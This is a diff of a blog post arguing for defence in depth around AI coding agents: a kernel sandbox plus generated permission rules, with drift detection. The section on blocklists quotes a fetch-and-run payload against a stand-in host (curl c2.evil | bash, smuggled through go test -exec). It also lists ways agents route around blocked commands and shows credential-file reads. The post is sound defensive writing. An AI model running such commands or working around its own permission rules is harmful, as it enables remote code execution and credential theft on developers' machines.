@@ -42,7 +42,7 @@
   <meta itemprop="description" content="On recklessness, professional abdication, and an opinionated approach to agentic coding security">
   <meta itemprop="datePublished" content="2026-02-22T00:00:00+00:00">
   <meta itemprop="dateModified" content="2026-02-22T00:00:00+00:00">
-  <meta itemprop="wordCount" content="3646">
+  <meta itemprop="wordCount" content="3606">
   <meta itemprop="image" content="/images/share.png">
   <meta itemprop="keywords" content="Security,Ai,Development,Agents">
 <meta name="referrer" content="no-referrer-when-downgrade" />
@@ -289,16 +289,16 @@ One hundred percent of tested AI coding IDEs were vulnerable [3].</p>
 <p>Eighty-five percent of developers now regularly use AI coding tools [4]. Forty-two
 percent of committed code is AI-assisted [5]. Microsoft and Google each report that
 roughly 30% of their code is AI-generated. The transformation happened in under two years.</p>
-<p>In February 2025, Andrej Karpathy coined &ldquo;vibe coding&rdquo; — describe what you want to an LLM,
+<p>In February 2025, Andrej Karpathy coined &ldquo;vibe coding&rdquo;: describe what you want to an LLM,
 accept whatever comes out, barely look at the result [6]. It was meant as a playful
 observation. It became an ideology. Organizations flood with &ldquo;POC&rdquo; demos where someone
 builds a Hello World CRUD app and presents it to management: <em>Look what I can do, and I&rsquo;m
-not even a coder.</em> The act of writing software became trivially easy. The hard part — deciding
-what to build, understanding the domain, maintaining the result — remains exactly as
+not even a coder.</em> The act of writing software became trivially easy. The hard part (deciding
+what to build, understanding the domain, maintaining the result) remains exactly as
 difficult as before. But nobody wants to hear that.</p>
 <p>The security controls did not keep pace. Only 14.4% of AI agents go live with full security
 and IT approval [7]. Eighty-two percent of executives feel confident existing policies
-protect them — a dangerous mismatch with the reality of what these tools can do
+protect them, a dangerous mismatch with the reality of what these tools can do
 when left unconstrained [7].</p>
 <h2 id="3-yolo-mode-the-professional-abdication">3. YOLO Mode: The Professional Abdication</h2>
 <h3 id="the-numbers-dont-lie">The Numbers Don&rsquo;t Lie</h3>
@@ -313,7 +313,7 @@ GitHub repositories. The findings are sobering [8]:</p>
   </thead>
   <tbody>
       <tr>
-          <td><code>Bash(find:*)</code> — can execute via <code>-exec</code></td>
+          <td><code>Bash(find:*)</code> (can execute via <code>-exec</code>)</td>
           <td>29.0%</td>
       </tr>
       <tr>
@@ -325,11 +325,11 @@ GitHub repositories. The findings are sobering [8]:</p>
           <td>24.5%</td>
       </tr>
       <tr>
-          <td><code>Bash(rm:*)</code> — unrestricted delete</td>
+          <td><code>Bash(rm:*)</code> (unrestricted delete)</td>
           <td>22.2%</td>
       </tr>
       <tr>
-          <td><code>Bash(curl:*)</code> — download anything</td>
+          <td><code>Bash(curl:*)</code> (download anything)</td>
           <td>21.3%</td>
       </tr>
       <tr>
@@ -337,7 +337,7 @@ GitHub repositories. The findings are sobering [8]:</p>
           <td>19.7%</td>
       </tr>
       <tr>
-          <td><code>Bash(python:*)</code> — arbitrary execution</td>
+          <td><code>Bash(python:*)</code> (arbitrary execution)</td>
           <td>14.5%</td>
       </tr>
       <tr>
@@ -348,15 +348,15 @@ GitHub repositories. The findings are sobering [8]:</p>
 </table>
 <p>Read that last row again. Out of 18,470 configuration files, only 1.1% contained a single
 deny rule. The remaining 98.9% placed zero restrictions on what their agent could do.</p>
-<p>The combined <code>git add</code> + <code>commit</code> + <code>push</code> chain — present in roughly 20% of
-configurations — means an agent can modify code, commit it, and push it to any repository
+<p>The combined <code>git add</code> + <code>commit</code> + <code>push</code> chain, present in roughly 20% of
+configurations, means an agent can modify code, commit it, and push it to any repository
 the developer has access to. Including corporate repositories. Including open-source
 projects with thousands of downstream consumers. UpGuard specifically flagged that
 &ldquo;attackers can capitalize on lax security practices in personal projects to pivot via
 AI agents to corporate or open-source repositories&rdquo; [8].</p>
 <h3 id="its-annoying-to-approve-all-the-time">&ldquo;It&rsquo;s Annoying to Approve All the Time&rdquo;</h3>
 <p>I hear this from colleagues I respect. Professionals who would never skip a code review,
-who insist on CI/CD pipelines and four-eye principles — but who run their coding agent in
+who insist on CI/CD pipelines and four-eye principles, but who run their coding agent in
 YOLO mode because &ldquo;the approval prompts are annoying.&rdquo;</p>
 <p>The psychology is well-documented. In 2016, NIST researchers studied security fatigue and
 found it leads to &ldquo;resignation, loss of control, fatalism, risk minimization, and decision
@@ -373,20 +373,20 @@ It is a choice to optimize for convenience over responsibility.</p>
 When an anesthesiologist finds patient monitoring annoying, they do not turn off the alarms.
 When you run an autonomous agent with unrestricted shell access on a machine connected
 to production credentials, you are not &ldquo;moving fast.&rdquo; You are creating risk for everyone
-downstream of your work — colleagues, users, your organization.</p>
+downstream of your work: colleagues, users, your organization.</p>
 <p>Just because every backoffice employee can now get a saw does not mean the master carpenter
 fires the artisans. The tool is not the craft. The judgment is the craft. And part of
 that judgment is knowing when your tool needs a guard rail.</p>
 <p>The OWASP Top 10 for Agentic Applications, published in December 2025 by over 100 security
 researchers, established the <em>principle of least agency</em>: AI agents should be given the
 minimum autonomy, tool access, and credential scope required for their task, and no
-more [12]. This is not a novel idea. It is the principle of least privilege — a
-foundational concept in computer security for five decades — applied to a new category
+more [12]. This is not a novel idea. It is the principle of least privilege (a
+foundational concept in computer security for five decades), applied to a new category
 of software. That we need a new OWASP list to remind developers of this principle tells
 you how far the baseline has slipped.</p>
 <h2 id="4-the-incident-gallery">4. The Incident Gallery</h2>
 <p>The following is not a comprehensive list. It is a curated selection of incidents from a
-single twelve-month period — March 2025 through February 2026 — chosen to illustrate the
+single twelve-month period (March 2025 through February 2026), chosen to illustrate the
 breadth and depth of the attack surface.</p>
 <table>
   <thead>
@@ -452,7 +452,7 @@ breadth and depth of the attack surface.</p>
 <p>The pattern is unmistakable: every agent, every vendor, every architecture. This is not a
 bug in any particular implementation. It is a structural property of the design space.</p>
 <p>Simon Willison, who tracked these disclosures throughout 2025, identified the &ldquo;lethal
-trifecta&rdquo; — the three capabilities that create catastrophic risk when combined: access to
+trifecta&rdquo;, the three capabilities that create catastrophic risk when combined: access to
 private data, exposure to untrusted content, and external communication ability [22].
 Every AI coding agent possesses all three by design.</p>
 <h2 id="5-the-structural-problem">5. The Structural Problem</h2>
@@ -503,8 +503,8 @@ enforcement semantics:</p>
       </tr>
   </tbody>
 </table>
-<p>If you use two agents — a common scenario for teams that use Copilot in the IDE and
-Claude Code on the command line — you maintain two separate security configurations.
+<p>If you use two agents (a common scenario for teams that use Copilot in the IDE and
+Claude Code on the command line), you maintain two separate security configurations.
 When a policy changes (say, adding <code>~/.aws</code> to the deny list), you update two files
 independently, in two different formats, with two different semantics.</p>
 <p>N agents times M rules equals N*M manual configuration entries. Each independently
@@ -519,11 +519,11 @@ expanding authority, not just changing outputs&rdquo; [25].</p>
 <h3 id="the-sandbox-gap">The Sandbox Gap</h3>
 <p>Here is the technical insight that most security discussions miss. OS-level sandboxes
 like Anthropic&rsquo;s <a href="https://github.com/anthropic-experimental/sandbox-runtime">SRT</a> (Sandbox Runtime Tool) enforce restrictions at the kernel
-level — <code>read()</code> syscalls are blocked, network connections are proxied through domain
+level: <code>read()</code> syscalls are blocked, network connections are proxied through domain
 allowlists. No agent bug, no prompt injection, no hallucination can bypass a
 kernel-enforced deny [11].</p>
-<p>But the sandbox only covers <strong>processes spawned by Bash</strong>. Built-in agent tools — Read,
-Write, Edit, Glob, Grep, WebFetch — run <em>inside</em> the agent&rsquo;s own Node.js process,
+<p>But the sandbox only covers <strong>processes spawned by Bash</strong>. Built-in agent tools (Read,
+Write, Edit, Glob, Grep, WebFetch) run <em>inside</em> the agent&rsquo;s own Node.js process,
 outside the sandbox entirely:</p>
 <pre tabindex="0"><code>Bash(cat ~/.aws/credentials)  →  Kernel blocks + Agent blocks  =  TWO layers
 Read(~/.aws/credentials)      →  Agent blocks only              =  ONE layer
@@ -535,12 +535,12 @@ in depth. It is a single point of failure.</p>
 <h3 id="why-blocklists-always-fail">Why Blocklists Always Fail</h3>
 <p>The security industry established decades ago that blocklists are structurally inferior
 to allowlists. Signature-based antivirus detects approximately 57% of attacks [29]. A
-single JSON encoding trick bypassed every major WAF vendor — Palo Alto, AWS, Cloudflare,
-F5, Imperva — because none parsed JSON syntax in SQL injection inspection [30]. The
+single JSON encoding trick bypassed every major WAF vendor (Palo Alto, AWS, Cloudflare,
+F5, Imperva) because none parsed JSON syntax in SQL injection inspection [30]. The
 attack surface is infinite; the blocklist is finite.</p>
 <p>Applied to coding agents: block <code>curl</code> and the LLM uses <code>python3 -c &quot;import urllib...&quot;</code>.
 Block <code>rm</code> and it uses <code>find . -delete</code>. Block <code>cat</code> and it reaches for <code>base64</code> or <code>xxd</code>.
-LLMs are non-deterministic — they will find execution paths you did not enumerate.</p>
+LLMs are non-deterministic: they will find execution paths you did not enumerate.</p>
 <p>Trail of Bits proved this definitively in October 2025 with argument injection attacks
 through whitelisted commands: <code>go test -exec 'bash -c &quot;curl c2.evil | bash&quot;'</code> exploits
 the pre-approved <code>go test</code> command to achieve arbitrary code execution. They called
@@ -551,8 +551,8 @@ every possible permutation of applications in a network environment&rdquo; [31].
 <h2 id="6-one-opinionated-approach-defense-in-depth-with-canonical-sources">6. One Opinionated Approach: Defense in Depth with Canonical Sources</h2>
 <p>The problem is not fully solvable at the application level today. Prompt injection remains an
 open research problem. Built-in tool enforcement depends on agent software quality. New
-attack vectors — MCP server poisoning, agent-to-agent manipulation, memory context
-corruption — expand the surface faster than defenses can cover it.</p>
+attack vectors (MCP server poisoning, agent-to-agent manipulation, memory context
+corruption) expand the surface faster than defenses can cover it.</p>
 <p>But the problem can be reduced. The approach described <a href="https://github.com/sysid/twsrt">here</a> is
 opinionated, specific, and has its limitations. It addresses two of the three
 structural problems identified above: the heterogeneity trap and the sandbox gap. It
@@ -570,10 +570,10 @@ Layer 2 (App):  Agent permissions — tool-level deny/ask/allow
                 Scope: ALL tools (Bash, Read, Write, Edit, WebFetch, ...)
                 Enforcement: Agent&#39;s internal permission engine
 </code></pre><p>Neither layer alone is sufficient. SRT cannot control built-in tools that run inside the
-agent process. Agent permissions are enforced in userspace — a single bug negates them
+agent process. Agent permissions are enforced in userspace: a single bug negates them
 (documented: Claude Code GitHub issues #6631, #24846 [27][28]).</p>
-<p>Together, they close each other&rsquo;s gaps. The most dangerous attack vector — arbitrary shell
-execution via Bash — gets kernel-level protection that is un-bypassable by the agent.
+<p>Together, they close each other&rsquo;s gaps. The most dangerous attack vector, arbitrary shell
+execution via Bash, gets kernel-level protection that is un-bypassable by the agent.
 Built-in tools get consistent, automatically-generated agent-level protection.
 The coverage matrix:</p>
 <table>
@@ -619,9 +619,9 @@ architecture cannot currently provide more (built-in tools).</p>
 <p>The heterogeneity problem is solved by refusing to maintain per-agent configurations
 manually. Two canonical files define all security policy:</p>
 <ul>
-<li><strong><code>~/.srt-settings.json</code></strong> — filesystem rules (what can be accessed) and network rules
+<li><strong><code>~/.srt-settings.json</code></strong>: filesystem rules (what can be accessed) and network rules
 (which domains are reachable)</li>
-<li><strong><code>bash-rules.json</code></strong> — command rules (what can be executed): deny list and ask list</li>
+<li><strong><code>bash-rules.json</code></strong>: command rules (what can be executed): deny list and ask list</li>
 </ul>
 <p>A single command translates these canonical sources into every agent&rsquo;s native configuration
 format. The translation is deterministic: given the same inputs, it produces identical
@@ -629,8 +629,8 @@ output. No runtime state, no randomness, no hand-editing.</p>
 <p>The key design decisions:</p>
 <p><strong>denyRead implies denyWrite.</strong> If a path is sensitive enough to deny reading, it must not
 be writable either. A <code>denyRead</code> entry for <code>~/.aws</code> generates deny rules for Read, Write,
-Edit, and MultiEdit — preventing both credential exfiltration and credential modification.</p>
-<p><strong>Lossy mappings are explicit.</strong> Copilot CLI has no &ldquo;ask&rdquo; equivalent — it only supports
+Edit, and MultiEdit, preventing both credential exfiltration and credential modification.</p>
+<p><strong>Lossy mappings are explicit.</strong> Copilot CLI has no &ldquo;ask&rdquo; equivalent; it only supports
 deny or allow. When an &ldquo;ask&rdquo; rule is translated for Copilot, it maps to deny (the more
 restrictive option) and emits a warning to stderr. The administrator knows exactly
 where fidelity is reduced.</p>
@@ -643,14 +643,14 @@ or MCP tool permission survives regeneration.</p>
 <p>The final piece: verification. A diff command compares generated rules against existing
 agent configurations and reports missing or extra entries. Run it in CI. Run it in a
 cron job. When someone hand-edits a managed section or a policy update hasn&rsquo;t propagated,
-you know immediately — not when the exploit arrives.</p>
+you know immediately, not when the exploit arrives.</p>
 <pre tabindex="0"><code>$ twsrt diff
 claude: 2 missing, 1 extra
   + Bash(terraform)       (missing from existing)
   + Bash(terraform *)     (missing from existing)
   - Bash(docker run:*)    (in existing, not in sources)
-</code></pre><p>The attack surface for human error drops from O(N*M) — N agents times M rules, each
-maintained independently — to O(M). M rules maintained once, translated everywhere,
+</code></pre><p>The attack surface for human error drops from O(N*M) (N agents times M rules, each
+maintained independently) to O(M). M rules maintained once, translated everywhere,
 verified automatically.</p>
 <h2 id="7-limitations">7. Limitations</h2>
 <p>This approach has boundaries:</p>
@@ -685,8 +685,8 @@ to be ahead of it or be made an example by it.</p>
 compulsion. It should rest on professional identity. We are software engineers. We
 build systems that other people depend on.</p>
 <p>When you grant an autonomous agent unrestricted
-access to your development environment — to your credentials, your repositories, your
-production infrastructure — and you do so because configuring the restrictions is
+access to your development environment (to your credentials, your repositories, your
+production infrastructure) and you do so because configuring the restrictions is
 &ldquo;annoying,&rdquo; you are making a statement about what kind of professional you are.</p>
 <p>Technology to manage the friction exists. OS-level sandboxes reduce prompts by 84%
 while maintaining kernel-enforced security boundaries [11]. Canonical source models with
@@ -700,7 +700,7 @@ what you have allowed. If you are in the 98.9%, you know what needs to change.</
 <li><strong>Enable the <a href="https://github.com/anthropic-experimental/sandbox-runtime">SRT</a> sandbox.</strong> It reduces prompts dramatically while providing
 kernel-level enforcement for Bash commands.</li>
 <li><strong>Adopt a canonical source model.</strong> Whether through automated tooling or disciplined
-manual process — stop maintaining independent copies of the same security policy
+manual process: stop maintaining independent copies of the same security policy
 across multiple agents. If you want use <a href="https://github.com/sysid/twsrt">twsrt</a>.</li>
 <li><strong>Run drift detection.</strong> Regularly. Trust, but verify.</li>
 <li><strong>Stop using YOLO mode.</strong> If the prompts are annoying, fix the system. Do not remove
